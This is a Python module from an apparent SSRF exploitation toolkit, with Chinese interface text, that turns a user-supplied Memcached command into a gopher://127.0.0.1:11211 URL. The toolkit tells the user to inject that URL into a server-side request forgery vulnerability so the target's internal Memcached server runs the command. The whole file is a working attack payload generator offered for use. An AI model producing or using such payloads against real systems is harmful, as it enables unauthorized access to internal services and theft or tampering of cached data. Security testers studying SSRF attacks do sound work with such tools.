import urllib
import urllib.parse
from .colors import c, DIM, BOLD, CYAN, YELLOW, GREEN, RED, UNDERLINE, BRIGHT_CYAN, BRIGHT_GREEN, BRIGHT_YELLOW, print_banner, print_step, print_info, print_success, print_warning


def DumpMemcached():
    print_banner("Memcached 数据转储")

    print_step(1, "配置 Memcached 命令")
    print_info("输入要在 Memcached 服务器上执行的命令")
    print_warning("常用命令: stats, stats items, stats slabs, get key_name")
    code = input(c("  > Memcached 命令: ", CYAN))
    while not code:
        print(c("  [x] 命令不能为空", RED))
        code = input(c("  > Memcached 命令: ", CYAN))

    payload = (
        urllib.parse.quote_plus(code)
        .replace("+", "%20")
        .replace("%2F", "/")
        .replace("%25", "%")
        .replace("%3A", ":")
    )

    finalpayload = f"gopher://127.0.0.1:11211/_%0d%0a{payload}%0d%0a"

    print_banner("利用链接已生成")
    print("")
    print(c("  将以下 URL 编码到 SSRF 漏洞中:", CYAN))
    print("")
    print(c("  " + "-" * 48, DIM))
    print(c(finalpayload, UNDERLINE + YELLOW))
    print(c("  " + "-" * 48, DIM))
    print("")
    print_success(f"将执行 Memcached 命令: {code}")

    print("\n" + c("  " + "=" * 48, BRIGHT_CYAN))
    print(c("  原作者: $_SpyD3r_$", BRIGHT_CYAN))
    print(c("  修改者: @_mingy_@", BRIGHT_CYAN))
    print(c("  " + "=" * 48, BRIGHT_CYAN))
